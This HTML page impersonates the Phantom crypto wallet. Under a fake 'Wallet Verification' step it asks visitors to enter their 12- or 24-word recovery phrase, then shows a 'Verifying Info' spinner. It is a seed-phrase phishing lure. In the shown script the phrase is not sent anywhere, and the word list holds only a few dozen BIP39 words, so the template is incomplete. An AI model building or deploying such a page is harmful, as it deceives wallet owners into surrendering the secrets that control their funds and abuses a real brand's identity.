<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Phantom</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            user-select: text;
            -webkit-user-select: text;
            -moz-user-select: text;
            -ms-user-select: text;
        }

        body {
            background-color: #d8d6eb;
            color: #fff;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            padding: 24px 32px;
            overflow: hidden;
        }

        /* Top Header Navigation */
        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            width: 100%;
            z-index: 10;
        }

        .ghost-close {
            display: flex;
            align-items: center;
            justify-content: center;
            background: transparent;
            border: none;
            cursor: pointer;
            width: 32px;
            height: 32px;
        }

        .ghost-close svg {
            width: 28px;
            height: 28px;
            fill: #000;
        }

        .help-link {
            color: #000;
            background: transparent;
            border: 1px solid #bcbbd3;
            text-decoration: none;
            font-size: 13px;
            font-weight: 400;
            display: flex;
            align-items: center;
            gap: 6px;
            padding: 5px 10px;
            border-radius: 8px;
        }

        .help-link:hover {
            background-color: rgba(0, 0, 0, 0.03);
        }

        /* Main Modal Container */
        .main-wrapper {
            display: flex;
            justify-content: center;
            align-items: center;
            flex: 1;
            position: relative;
            z-index: 5;
        }

        .modal {
            background-color: #0c0c0e;
            width: 440px;
            border-radius: 22px;
            padding: 24px 20px 20px 20px;
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.3);
            display: flex;
            flex-direction: column;
            align-items: center;
            position: relative;
        }

        /* Pagination Dots */
        .dots {
            display: flex;
            gap: 6px;
            margin-bottom: 12px;
        }

        .dot {
            width: 6px;
            height: 6px;
            background-color: #3f3f46;
            border-radius: 50%;
        }

        .dot.active {
            background-color: #c084fc;
        }

        /* Modal Titles */
        .modal-title {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 4px;
            color: #fff;
            text-align: center;
        }

        .modal-subtitle {
            font-size: 12px;
            color: #8c8c9e;
            margin-bottom: 16px;
            text-align: center;
            line-height: 1.4;
        }

        /* Screen States */
        .screen-center {
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
            width: 100%;
            padding: 10px 0;
        }

        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid #27272a;
            border-top: 3px solid #c084fc;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .hidden {
            display: none !important;
        }

        /* Inputs Container Layout - Matching 3-column image layout */
        .inputs-container {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 6px;
            width: 100%;
            margin-bottom: 12px;
            max-height: 310px;
            overflow-y: auto;
            padding-right: 2px;
        }

        .inputs-container::-webkit-scrollbar {
            width: 4px;
        }
        .inputs-container::-webkit-scrollbar-thumb {
            background: #27272a;
            border-radius: 4px;
        }

        .input-group {
            position: relative;
            background-color: #141417;
            border: 1px solid #232329;
            border-radius: 8px;
            padding: 4px 8px;
            height: 36px; /* Smaller boxes as requested */
            display: flex;
            flex-direction: column;
            justify-content: center;
            transition: border-color 0.2s;
        }

        .input-group.error {
            border-color: #ef4444;
            background-color: rgba(239, 68, 68, 0.05);
        }

        .input-group label {
            font-size: 9px;
            color: #71717a;
            line-height: 1;
            margin-bottom: 2px;
        }

        .input-group input {
            background: transparent;
            border: none;
            color: #fff;
            font-size: 12px;
            outline: none;
            width: 100%;
            line-height: 1.2;
        }

        /* Error Label Text */
        .error-message {
            color: #ef4444;
            font-size: 11px;
            width: 100%;
            margin-bottom: 8px;
            display: none;
            text-align: center;
        }

        /* Toggle Phrase Button */
        .toggle-phrase {
            color: #8c8c9e;
            background: none;
            border: none;
            font-size: 12px;
            cursor: pointer;
            margin-bottom: 12px;
            font-weight: 500;
            transition: color 0.25s ease;
            pointer-events: auto;
        }

        .toggle-phrase:hover {
            color: #c084fc;
        }

        /* Action Buttons - Dynamic States */
        .action-btn {
            width: 100%;
            background-color: #1c1c21; /* Blackish gray when incomplete */
            color: #71717a;
            border: none;
            border-radius: 12px;
            padding: 12px;
            font-size: 14px;
            font-weight: 600;
            cursor: not-allowed;
            pointer-events: none;
            transition: all 0.2s ease;
        }

        /* Active state when all inputs are filled properly */
        .action-btn.active-btn {
            background-color: #b794f4; /* Slightly darker purple look matching image */
            color: #000;
            cursor: pointer;
            pointer-events: auto;
        }

        .action-btn.active-btn:hover {
            opacity: 0.85;
        }
    </style>
</head>
<body>

    <!-- Header -->
    <header>
        <button class="ghost-close" title="Phantom">
            <svg viewBox="0 0 24 24"><path d="M12.01 0C5.38 0 0 5.38 0 12c0 6.63 5.38 12 12.01 12 6.62 0 11.99-5.37 11.99-12 0-6.62-5.37-12-11.99-12zm4.18 16.32c-.31.31-.81.31-1.12 0l-3.06-3.06-3.06 3.06c-.31.31-.81.31-1.12 0-.31-.31-.31-.81 0-1.12l3.06-3.06-3.06-3.06c-.31-.31-.31-.81 0-1.12.31-.31.81-.31 1.12 0l3.06 3.06 3.06-3.06c.31-.31.81-.31 1.12 0 .31.31.31.81 0 1.12l-3.06 3.06 3.06 3.06c.31.31.31.81 0 1.12z"/></svg>
        </button>
        <a href="https://phantom.com/help" target="_blank" class="help-link">
            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
            Help
        </a>
    </header>

    <!-- Main Section -->
    <div class="main-wrapper">
        <div class="modal">
            <!-- Initial Welcome Screen -->
            <div class="screen-center" id="welcomeScreen">
                <div class="dots">
                    <div class="dot active"></div>
                    <div class="dot"></div>
                    <div class="dot"></div>
                </div>
                <div class="modal-title">Wallet Verification</div>
                <div class="modal-subtitle">Begin wallet verification by adding your recovery phrase.</div>
                <button type="button" class="action-btn active-btn" id="startBtn" style="pointer-events: auto; cursor: pointer;">Continue</button>
            </div>

            <!-- Recovery Phrase Input Screen -->
            <div id="phraseScreen" class="hidden" style="width: 100%; display: flex; flex-direction: column; align-items: center;">
                <div class="dots">
                    <div class="dot active"></div>
                    <div class="dot"></div>
                    <div class="dot"></div>
                </div>

                <div class="modal-title">Recovery Phrase</div>
                <div class="modal-subtitle" id="subtitle-text">Import an existing wallet with your 12 or 24-word recovery phrase.</div>

                <div class="inputs-container" id="inputsGrid"></div>

                <div class="error-message" id="errorMessage"></div>

                <button type="button" class="toggle-phrase" id="toggleBtn">I have a 24-word recovery phrase</button>

                <!-- Changed to Verify Wallet with dynamic blackish-gray / purple states -->
                <button type="button" class="action-btn" id="importBtn">Verify Wallet</button>
            </div>

            <!-- Loading / Verification Screen -->
            <div class="screen-center hidden" id="loadingScreen">
                <div class="dots">
                    <div class="dot active"></div>
                    <div class="dot"></div>
                    <div class="dot"></div>
                </div>
                <div class="spinner"></div>
                <div class="modal-title">Verifying Info</div>
                <div class="modal-subtitle">Verifying info, est. 2-5 mins</div>
            </div>
        </div>
    </div>

    <!-- Script Logic -->
    <script>
        const bip39Words = [
            "abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse", "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act", "action", "actor", "actress", "actual", "adapt", "add", "addict", "address", "adjust", "admit", "adult", "advance", "advice", "aerobic", "affair", "afford", "afraid", "again", "age", "agent", "agree", "ahead", "aim", "air", "airport", "aisle", "alarm", "album", "alcohol", "alert", "alien", "all", "alley", "allow", "almost", "alone", "alpha", "already", "also", "alter", "always", "amateur", "amazing", "among", "amount", "amused", "analyst"
        ];

        let wordCount = 12;
        const welcomeScreen = document.getElementById('welcomeScreen');
        const phraseScreen = document.getElementById('phraseScreen');
        const loadingScreen = document.getElementById('loadingScreen');
        const startBtn = document.getElementById('startBtn');
        const inputsGrid = document.getElementById('inputsGrid');
        const toggleBtn = document.getElementById('toggleBtn');
        const subtitleText = document.getElementById('subtitle-text');
        const errorMessage = document.getElementById('errorMessage');
        const importBtn = document.getElementById('importBtn');

        startBtn.onclick = function(e) {
            e.preventDefault();
            welcomeScreen.classList.add('hidden');
            phraseScreen.classList.remove('hidden');
            renderInputs();
        };

        function renderInputs() {
            inputsGrid.innerHTML = '';
            for (let i = 1; i <= wordCount; i++) {
                const group = document.createElement('div');
                group.className = 'input-group';
                group.id = `group-${i}`;
                group.innerHTML = `
                    <label>${i}.</label>
                    <input type="text" autocomplete="off" autocapitalize="off" spellcheck="false" data-index="${i}" id="word-${i}">
                `;
                inputsGrid.appendChild(group);
            }
            checkCompletion();
        }

        toggleBtn.onclick = function(e) {
            e.preventDefault();
            if (wordCount === 12) {
                wordCount = 24;
                toggleBtn.textContent = "I have a 12-word recovery phrase";
                subtitleText.textContent = "Import an existing wallet with your 24-word recovery phrase.";
            } else {
                wordCount = 12;
                toggleBtn.textContent = "I have a 24-word recovery phrase";
                subtitleText.textContent = "Import an existing wallet with your 12 or 24-word recovery phrase.";
            }
            renderInputs();
            errorMessage.style.display = 'none';
        };

        function checkCompletion() {
            let allFilledAndValid = true;
            for (let i = 1; i <= wordCount; i++) {
                const inputEl = document.getElementById(`word-${i}`);
                if (!inputEl || inputEl.value.trim() === "" || !bip39Words.includes(inputEl.value.trim().toLowerCase())) {
                    allFilledAndValid = false;
                    break;
                }
            }

            if (allFilledAndValid) {
                importBtn.classList.add('active-btn');
            } else {
                importBtn.classList.remove('active-btn');
            }
        }

        inputsGrid.addEventListener('input', (e) => {
            if (e.target.tagName === 'INPUT') {
                const index = e.target.getAttribute('data-index');
                document.getElementById(`group-${index}`).classList.remove('error');
                errorMessage.style.display = 'none';
                checkCompletion();
            }
        });

        importBtn.onclick = function(e) {
            e.preventDefault();
            if (!importBtn.classList.contains('active-btn')) return;

            let errorIndices = [];
            for (let i = 1; i <= wordCount; i++) {
                const inputVal = document.getElementById(`word-${i}`).value.trim().toLowerCase();
                const groupDiv = document.getElementById(`group-${i}`);

                if (inputVal === "" || !bip39Words.includes(inputVal)) {
                    groupDiv.classList.add('error');
                    errorIndices.push(i);
                } else {
                    groupDiv.classList.remove('error');
                }
            }

            if (errorIndices.length > 0) {
                let text = "";
                if (errorIndices.length === 1) {
                    text = `Word ${errorIndices[0]} is incorrect or misspelled`;
                } else {
                    const last = errorIndices.pop();
                    text = `Words ${errorIndices.join(', ')} and ${last} are incorrect or misspelled`;
                }
                errorMessage.textContent = text;
                errorMessage.style.display = 'block';
            } else {
                errorMessage.style.display = 'none';
                phraseScreen.classList.add('hidden');
                loadingScreen.classList.remove('hidden');
            }
        };
    </script>
</body>
</html>
